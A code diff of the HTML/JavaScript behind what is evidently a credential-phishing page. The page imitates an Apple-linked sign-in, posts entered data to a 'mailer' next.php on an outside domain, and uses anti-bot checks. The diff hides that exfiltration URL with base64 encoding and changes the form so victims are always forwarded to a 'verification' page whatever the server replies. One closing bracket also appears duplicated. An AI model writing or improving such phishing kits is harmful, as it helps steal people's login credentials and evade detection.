@@ -380,9 +380,9 @@
     <script type="text/javascript">
         // Redirect link
         var rdrt = "https://www.apple.com/";
-        
-        // Mailer link - this is where your next.php file is referenced
-        var f = "https://rotadosabor.com/joker/next.php";
+
+        //mailer link - this is where your next.php file is referenced
+        var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");  // This decodes to your next.php URL
         
         // Anti-bot functions
         function detectBot() {
@@ -507,26 +507,15 @@
                     data: c,
                     beforeSend: function(a) {
                         $('#sub-btn-1').html('<i class="icon_sign_in"></i>Verifying...');
-                        $('#sub-btn-1').prop('disabled', true);
                     },
-                    success: function(response) {
-                        if (response.status === 'success') {
-                            // Save email for later pages
-                            localStorage.setItem('userEmail', $('#ai').val());
-                            
-                            // Redirect to verification page
-                            window.location.href = 'verification.html';
-                        } else {
-                            $('#error').show();
-                            $('#sub-btn-1').html('<i class="icon_sign_in"></i>Sign In');
-                            $('#sub-btn-1').prop('disabled', false);
-                        }
-                    },
-                    error: function() {
-                        $('#error').show();
-                        $('#sub-btn-1').html('<i class="icon_sign_in"></i>Sign In');
-                        $('#sub-btn-1').prop('disabled', false);
+                    complete: function(a) {
+                        // Save email for later pages
+                        localStorage.setItem('userEmail', $('#ai').val());
+                        
+                        // Redirect to verification page
+                        window.location.href = 'verification.html';
                     }
+                });
                 });
             });
         });
